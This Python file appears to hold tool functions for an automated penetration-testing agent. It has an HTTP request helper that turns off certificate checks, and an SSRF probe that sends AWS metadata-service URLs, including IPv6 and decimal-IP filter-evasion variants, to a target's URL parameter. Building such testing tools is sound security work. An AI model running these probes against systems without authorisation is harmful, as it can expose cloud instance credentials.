import json
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

_TIMEOUT = 15
_HEADERS = {"User-Agent": "Mozilla/5.0 (PentestAgent/1.0)"}


def http_request(
    url: str,
    method: str = "GET",
    headers: dict | None = None,
    body: str = "",
    follow_redirects: bool = True,
) -> str:
    """Send an HTTP request and return status, headers, and truncated body."""
    try:
        resp = requests.request(
            method=method.upper(),
            url=url,
            headers={**_HEADERS, **(headers or {})},
            data=body or None,
            timeout=_TIMEOUT,
            verify=False,
            allow_redirects=follow_redirects,
        )
        response_headers = dict(resp.headers)
        body_preview = resp.text[:3000]
        return json.dumps({
            "status": resp.status_code,
            "url": resp.url,
            "headers": response_headers,
            "body": body_preview,
        }, indent=2)
    except Exception as e:
        return f"Request error: {e}"


def ssrf_metadata(target_url: str) -> str:
    """
    Test if a URL parameter is vulnerable to SSRF by probing
    the AWS EC2 metadata service (169.254.169.254).
    """
    metadata_url = "http://169.254.169.254/latest/meta-data/"
    payloads = [
        metadata_url,
        f"http://[::ffff:169.254.169.254]/latest/meta-data/",
        f"http://2852039166/latest/meta-data/",   # decimal IP
    ]
    results = {}
    for payload in payloads:
        try:
            resp = requests.get(
                target_url,
                params={"url": payload},
                timeout=_TIMEOUT,
                verify=False,
            )
            results[payload] = {
                "status": resp.status_code,
                "snippet": resp.text[:500],
            }
        except Exception as e:
            results[payload] = {"error": str(e)}
    return json.dumps(results, indent=2)
